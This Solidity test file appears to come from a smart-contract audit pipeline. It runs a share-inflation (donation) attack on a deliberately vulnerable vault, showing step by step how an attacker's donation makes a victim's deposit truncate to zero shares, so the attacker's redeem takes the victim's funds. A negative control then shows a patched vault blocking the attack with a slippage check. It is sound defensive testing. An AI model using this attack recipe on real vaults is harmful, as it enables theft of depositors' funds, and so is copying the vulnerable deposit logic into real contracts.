// SPDX-License-Identifier: MIT
// HermeticVault.t.sol — H-04 hermetic smoke (PR603 § Gate 2 acceptance #8).
// Drives the share-inflation attack against HermeticVault and proves the
// victim's lost asset matches the attacker's gain via a measured assertEq
// state delta (FN2 lesson, checklist § 1.3 / T-03 financial-impact-gate).
pragma solidity ^0.8.20;

import "./HermeticVault.sol";
import "./HermeticVault_clean.sol";

contract MockERC20 {
    string public name = "MOCK";
    string public symbol = "MOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Minimal Foundry test interface so we don't import forge-std (hermetic).
interface IVm {
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
}

contract HermeticVaultTest {
    address constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
    IVm vm = IVm(HEVM_ADDRESS);

    MockERC20 token;
    HermeticVault vault;
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    uint256 constant DONATION = 1e18;        // attacker inflates price-per-share
    uint256 constant VICTIM_DEPOSIT = 5e17;  // 0.5 token; less than DONATION → truncates to 0 shares

    function setUp() public {
        token = new MockERC20();
        vault = new HermeticVault(IERC20Min(address(token)));
        token.mint(attacker, DONATION + 1);
        token.mint(victim, VICTIM_DEPOSIT);
    }

    // PROOF — vulnerable variant: victim's deposit is effectively transferred
    // to the attacker via the inflation attack. We measure the actual fund
    // flow with assertEq on token balances (FN2 lesson).
    function test_inflationAttack_drainsVictim() public {
        setUp();

        // Step 1: attacker deposits 1 wei → mints 1 share.
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        vm.stopPrank();

        // Step 2: attacker donates DONATION underlying directly → totalAssets
        // jumps without minting new shares; price-per-share is now DONATION+1.
        vm.prank(attacker);
        token.transfer(address(vault), DONATION);

        // Step 3: victim deposits VICTIM_DEPOSIT (< totalAssets) → integer-
        // division truncates to 0 shares. Victim receives 0 shares for their
        // 5e17 token.
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();
        assertEq(victimShares, 0, "victim must receive 0 shares (truncation bug)");

        // Step 4: attacker redeems their 1 share → drains the entire vault.
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        uint256 redeemed = vault.redeem(1, attacker);

        // FN2-grade assertions: measured state delta proving fund flow.
        // Attacker net P&L: gained = redeemed - 1(initial deposit) - DONATION(donated lump).
        // Victim loss: VICTIM_DEPOSIT (deposited and got 0 shares back).
        // Conservation: attacker_gain_from_victim == victim_loss.
        uint256 attackerGain = redeemed - 1 - DONATION;
        assertEq(attackerGain, VICTIM_DEPOSIT, "attacker gain must equal victim loss (fund-flow conservation)");
        assertEq(token.balanceOf(victim), 0, "victim drained to zero");
        assertEq(token.balanceOf(attacker), attackerBalanceBefore + redeemed, "attacker balance increased by full redeem");
        assertEq(vault.totalSupply(), 0, "vault fully unwound");
    }

    // NEGATIVE CONTROL — clean variant: same attacker recipe must NOT drain
    // the victim. The clean vault's `minSharesOut` slippage check + virtual-
    // offset together force the attacker to either give the victim non-zero
    // shares or to fail the deposit entirely.
    function test_inflationAttack_blockedOnCleanVariant() public {
        // Re-setup against the clean variant.
        token = new MockERC20();
        HermeticVaultClean cleanVault = new HermeticVaultClean(IERC20Min(address(token)));
        token.mint(attacker, DONATION + 1);
        token.mint(victim, VICTIM_DEPOSIT);

        vm.startPrank(attacker);
        token.approve(address(cleanVault), type(uint256).max);
        cleanVault.deposit(1, attacker, 1); // explicit minSharesOut=1
        vm.stopPrank();

        vm.prank(attacker);
        token.transfer(address(cleanVault), DONATION);

        // Victim demands minSharesOut=1. The clean vault's slippage check is
        // the second line of defense: under the inflated ratio the math still
        // truncates `shares` to 0 (with VIRTUAL_SHARES=VIRTUAL_ASSETS=1 the
        // offset is too small to flip the truncation), but
        // `require(shares >= minSharesOut)` reverts the deposit before the
        // victim's funds leave their wallet.
        vm.startPrank(victim);
        token.approve(address(cleanVault), type(uint256).max);
        bool reverted;
        try cleanVault.deposit(VICTIM_DEPOSIT, victim, 1) {
            reverted = false;
        } catch {
            reverted = true;
        }
        vm.stopPrank();

        // Negative-control assertions: clean variant MUST revert AND victim
        // MUST retain their original balance (no fund flow to attacker).
        if (!reverted) revert("clean variant should have reverted on slippage check");
        assertEq(token.balanceOf(victim), VICTIM_DEPOSIT, "clean variant must protect victim funds");
    }

    // Minimal assertEq impl — avoids forge-std dep. forge-std would normally
    // override these via cheatcodes; for hermetic build we use bare reverts.
    function assertEq(uint256 a, uint256 b, string memory err) internal pure {
        if (a != b) revert(err);
    }
}
